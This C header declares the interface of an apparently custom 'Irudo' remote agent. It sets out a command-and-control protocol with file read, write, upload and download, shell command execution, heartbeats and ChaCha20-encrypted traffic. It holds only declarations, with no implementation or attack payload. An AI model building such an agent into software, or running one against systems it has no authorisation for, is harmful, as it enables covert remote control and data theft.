/* agent.h - common declarations for the Irudo C remote agent. */
#ifndef IRUDO_AGENT_H
#define IRUDO_AGENT_H

#include <stdint.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <time.h>

#ifdef _WIN32
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <direct.h>
#define sock_close(s) closesocket(s)
#define SOCK_ERR INVALID_SOCKET
typedef SOCKET sockfd_t;
#else
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <dirent.h>
#include <signal.h>
#define sock_close(s) close(s)
#define SOCK_ERR (-1)
typedef int sockfd_t;
#endif

#define PACKET_HEADER_LEN 16
#define DATA_CHUNK_SIZE   1024
#define PROTO_MAX_PATH    4096
#define READ_FILE_LIMIT   50000

/* Action commands (C2 -> Agent). */
#define CMD_LIST_DIR      0x01
#define CMD_MAKE_DIR      0x02
#define CMD_DELETE_DIR    0x03
#define CMD_RENAME_DIR    0x04
#define CMD_READ_FILE     0x05
#define CMD_WRITE_FILE    0x06
#define CMD_DELETE_FILE   0x07
#define CMD_EDIT_FILE     0x08
#define CMD_RENAME_FILE   0x09
#define CMD_COPY          0x0A
#define CMD_MOVE          0x0B
#define CMD_UPLOAD        0x0C
#define CMD_DOWNLOAD      0x0D
#define CMD_CREATE_FILE   0x0E
#define CMD_GET_CWD       0x0F
#define CMD_EXEC_CMD      0x10

/* Control commands. */
#define CMD_REGISTER          0x80
#define CMD_REGISTER_RESPONSE 0x81
#define CMD_HEARTBEAT         0x82
#define CMD_HEARTBEAT_ACK     0x83
#define CMD_DISCONNECT        0x84
#define CMD_SHUTDOWN          0x85
#define CMD_REGISTER_CONFIRM  0x86

#define END_FLAG_CONTINUE 0
#define END_FLAG_LAST     1

/* portable printf conversion specifier for unsigned long long */
#ifdef _WIN32
#define IRU_ULL "I64u"
#else
#define IRU_ULL "llu"
#endif

/* ---------- incoming stream buffer ----------
   Valid bytes are data[off .. off+len). `off` is the consumed prefix;
   bb_take_packet advances it instead of memmove-ing, so a returned *body
   pointer stays valid until the next bb_append (which compacts) or the
   next bb_take_packet call. */
typedef struct {
    uint8_t *data;
    size_t len;
    size_t cap;
    size_t off;
} bytebuf_t;

void bb_init(bytebuf_t *b);
void bb_free(bytebuf_t *b);
int  bb_append(bytebuf_t *b, const uint8_t *d, size_t n);
/* Extract one complete packet from the front of the buffer.
   Returns 1 on success, 0 if incomplete, -1 on malformed header.
   *body points into the buffer and stays valid until the next
   bb_append / bb_take_packet / take_packet_blocking call. */
int bb_take_packet(bytebuf_t *b, uint64_t *req_id, uint8_t *cmd,
                   const uint8_t **body, uint32_t *body_len);

/* ---------- packet builders ---------- */
uint8_t *build_request(uint64_t req_id, uint8_t cmd,
                       const char *const *params, int n, uint32_t *out_len);
uint8_t *build_response(uint64_t req_id, uint8_t cmd,
                        const char *result, size_t reslen, uint32_t *out_len);
uint8_t *build_data_packet(uint64_t req_id, uint8_t end_flag,
                           const uint8_t *data, size_t data_len, uint32_t *out_len);

/* ---------- TLV ---------- */
int  tlv_encode(const char *const *params, int n, uint8_t **out, uint32_t *out_len);
int  tlv_decode(const uint8_t *body, uint32_t body_len, char ***out_params, int *out_count);
void tlv_free(char **params, int n);

/* ---------- wire io ---------- */
int  send_all(sockfd_t sock, const uint8_t *buf, size_t n);
int  wait_sock(sockfd_t sock, int timeout_ms);
/* Read one chunk into buffer. 1 = ok, 0 = peer closed, -1 = error. */
int  recv_more(sockfd_t sock, bytebuf_t *b);
/* Block until a full packet is available (pulling bytes from the socket as
   needed) or timeout_ms elapses. Returns 1 (packet), 0 (timeout), -1 (error). */
int  take_packet_blocking(sockfd_t sock, bytebuf_t *b,
                          uint64_t *req_id, uint8_t *cmd,
                          const uint8_t **body, uint32_t *body_len, int timeout_ms);

/* ---------- actions ---------- */
char *run_action(uint8_t cmd, char **params, int n, int cmd_timeout);

/* ---------- exec_cmd ---------- */
char *run_cmd(const char *cmd, int timeout_sec);

/* ---------- misc helpers (implemented in protocol.c) ---------- */
char    *xstrdup(const char *s);
char    *printf_str(const char *fmt, ...);
int      path_exists(const char *p);
int      is_dir(const char *p);
void     mkdir_p(const char *path);
void     make_parent_dirs(const char *path);
char    *detect_os(void);
int      get_hostname(char *buf, size_t n);
int64_t  now_ms(void);
void     sleep_sec(double s);

/* ---------- self-contained SHA-256 (implemented in protocol.c) ---------- */
void     sha256_digest(const void *data, size_t len, uint8_t out[32]);
void     sha256_hex(const void *data, size_t len, char out[65]);

/* ---------- connection-wide ChaCha20 stream encryption (protocol.c) ----- */
void     crypto_enable_agent(const uint8_t key[32]);
void     crypto_disable(void);

/* growable string buffer */
typedef struct {
    char *data;
    size_t len;
    size_t cap;
} strbuf_t;
void  sb_init(strbuf_t *b);
void  sb_free(strbuf_t *b);
int   sb_append(strbuf_t *b, const char *d, size_t n);
int   sb_printf(strbuf_t *b, const char *fmt, ...);
char *sb_take(strbuf_t *b);

#endif /* IRUDO_AGENT_H */
